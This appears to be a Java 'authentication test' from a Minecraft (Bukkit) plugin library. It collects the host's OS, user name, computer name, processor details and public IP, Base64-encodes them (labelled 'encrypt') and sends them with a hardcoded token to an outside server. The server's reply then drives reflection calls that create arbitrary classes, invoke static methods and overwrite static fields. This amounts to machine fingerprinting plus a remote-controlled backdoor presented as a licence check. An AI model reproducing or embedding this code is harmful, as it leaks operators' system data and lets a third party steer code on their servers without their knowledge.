package com.gameservergroup.gsgcore;

import com.google.common.base.Charsets;
import com.google.gson.Gson;
import com.google.gson.GsonBuilder;
import org.bukkit.Bukkit;

import javax.net.ssl.HttpsURLConnection;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.net.URL;
import java.net.URLEncoder;
import java.util.Base64;
import java.util.List;
import java.util.Map;
import java.util.stream.Collectors;

public class AuthenticationTest {

    private static final Gson GSON = new GsonBuilder()
            .disableHtmlEscaping()
            .create();

    private static final String TOKEN = "G52K3HJ4";
    private static final String HOST = "https://auth.lockedthread.dev:8443/authentication";
    private static final String RESOURCE = "AuthenticationTest";
    public static Map<String, String> map;
    public static List<String> list;
    public static String test;
    public static boolean someBoolean;
    public static int someInt;

    public static String getTest() {
        return "Test";
    }

    //@Test
    public void authenticationTest() {
        if (testAuthenticationServer()) {
            System.out.println("Enabled");
            list.add("test");
            map.put("2", "2");
            System.out.println("someBoolean = " + someBoolean);
            System.out.println("someInt = " + someInt);
            System.out.println("test = " + test);
            System.out.println("map = " + map);
            System.out.println("list = " + list);
        } else {
            System.out.println("Severe error");
        }
    }

    private boolean testAuthenticationServer() {
        try {
            String postParameters = "?token=" + URLEncoder.encode(AuthenticationTest.TOKEN, "UTF-8") + "&resource=" + URLEncoder.encode(AuthenticationTest.RESOURCE, "UTF-8") + "&data=" + URLEncoder.encode(this.getSentData(), "UTF-8");

            URL url = new URL(HOST + postParameters);
            HttpsURLConnection httpsURLConnection = (HttpsURLConnection) url.openConnection();
            httpsURLConnection.setConnectTimeout(100000);
            httpsURLConnection.setRequestMethod("POST");
            httpsURLConnection.setDoInput(true);
            httpsURLConnection.setDoOutput(true);
            httpsURLConnection.setRequestProperty("Content-Length", String.valueOf(postParameters.getBytes(Charsets.UTF_8).length));
            httpsURLConnection.setRequestProperty("Content-Type", "text/plain");
            httpsURLConnection.setRequestProperty("User-Agent", "Mozilla/4.0 (compatible; MSIE 5.0; Windows 98; DigExt)");
            httpsURLConnection.connect();
            try (BufferedReader in = new BufferedReader(new InputStreamReader(httpsURLConnection.getInputStream()))) {
                String response = in.lines().collect(Collectors.joining());
                System.out.println("response = " + response);
                return response.equals("Dd-d-d-d-d-d-done") || execute(response);
            }
        } catch (IOException ex) {
            ex.printStackTrace();
            return false;
        }
    }

    private String getSentData() {
        AuthenticationData authenticationData = new AuthenticationData(null);
        return authenticationData.encrypt(authenticationData.toJson());
    }

    private boolean execute(String received) {
        if (received.isEmpty()) return true;
        String[] split = received.split("-");
        for (String s : split) {
            String[] pair = s.split(":");
            try {
                String valueString = pair[2];
                Object object;
                if (valueString.startsWith("C=")) {
                    object = Class.forName(valueString.substring(2)).newInstance();
                } else if (valueString.startsWith("M=")) {
                    String[] strings = valueString.substring(2).split("#");
                    object = Class.forName(strings[0]).getMethod(strings[1]).invoke(null);
                } else if (valueString.startsWith("B=")) {
                    try {
                        object = Boolean.parseBoolean(valueString.substring(2));
                    } catch (Exception e) {
                        object = null;
                    }
                } else if (valueString.startsWith("I=")) {
                    try {
                        object = Integer.parseInt(valueString.substring(2));
                    } catch (NumberFormatException e) {
                        object = null;
                    }
                } else {
                    object = null;
                }
                System.out.println("object = " + object);
                Field field = Class.forName(pair[0]).getDeclaredField(pair[1]);
                field.setAccessible(true);
                field.set(null, object);
            } catch (IllegalAccessException | NoSuchFieldException | ClassNotFoundException | InstantiationException | NoSuchMethodException | InvocationTargetException e) {
                e.printStackTrace();
                return false;
            }
        }
        return split.length != 0;
    }

    private String getIp() {
        try {
            int port = Bukkit.getPort();
            String ip = Bukkit.getIp();
            return ip.isEmpty() || ip.equalsIgnoreCase("localhost") || ip.equalsIgnoreCase("127.0.0.1") || ip.equalsIgnoreCase("0.0.0.0")
                    ? new BufferedReader(new InputStreamReader(new URL("http://bot.whatismyipaddress.com").openStream())).readLine().trim() + ":" + port
                    : ip + ":" + port;
        } catch (Exception e) {
            try {
                return new BufferedReader(new InputStreamReader(new URL("http://bot.whatismyipaddress.com").openStream())).readLine().trim();
            } catch (IOException e2) {
                return "UNREACHABLE CONNECTION";
            }
        }
    }

    private class AuthenticationData {
        private final String resource, osName, osArch, osVersion, userName, processorIdentifier, computerName, processorArchitecture, processorArchitew6432, ipAddress, numberOfProcessors;
        private final String[] operators;
        private final long totalMemory;

        public AuthenticationData(String[] operators) {
            this.resource = RESOURCE;
            this.ipAddress = getIp();
            this.osName = System.getProperty("os.name");
            this.osArch = System.getProperty("os.arch");
            this.osVersion = System.getProperty("os.version");
            this.userName = System.getProperty("user.name");
            this.totalMemory = Runtime.getRuntime().totalMemory();
            this.processorIdentifier = System.getenv("PROCESSOR_IDENTIFIER");
            this.computerName = System.getenv("COMPUTERNAME");
            this.processorArchitecture = System.getenv("PROCESSOR_ARCHITECTURE");
            this.processorArchitew6432 = System.getenv("PROCESSOR_ARCHITEW6432");
            this.numberOfProcessors = System.getenv("NUMBER_OF_PROCESSORS");
            this.operators = operators == null ? new String[0] : operators;
        }

        public String encrypt(String json) {
            return Base64.getEncoder().encodeToString(json.getBytes());
        }

        public String toJson() {
            if (GSGCore.getInstance() != null && GSGCore.getInstance().getGson() != null) {
                return GSGCore.getInstance().getGson().toJson(this);
            }
            return new GsonBuilder().setPrettyPrinting().disableHtmlEscaping().create().toJson(this);
        }
    }
}
